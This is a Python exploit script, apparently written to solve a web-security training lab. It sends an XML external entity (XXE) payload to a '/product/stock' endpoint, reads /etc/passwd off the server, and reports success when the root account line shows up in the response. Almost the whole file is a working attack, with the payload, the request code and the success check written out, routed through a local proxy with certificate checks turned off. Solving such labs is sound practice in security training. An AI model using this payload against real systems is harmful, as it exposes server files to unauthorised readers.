import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def retrieve_file(url):
    # CREATE PAYLOAD
    xxe_payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE jito [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&ext;</productId><storeId>1</storeId></stockCheck>'

    # SEND POST REQUEST
    stock_url = url +  '/product/stock'
    params = xxe_payload
    r = requests.post(stock_url, data=params, verify=False, proxies=proxies)
    if r.status_code == 400 and "Invalid product ID: root:x:0:0:root:/root:/bin/bash" in r.text:
        print("[+] Exploit worked!")
        print(r.text)
        sys.exit(-1)
    else:
        print("[-] Exploit did not work!")
        sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Lab: Exploiting XXE using external entities to retrieve files")
    print("""[+] This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
    To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.""")

    retrieve_file(url)


if __name__ == "__main__":
    main()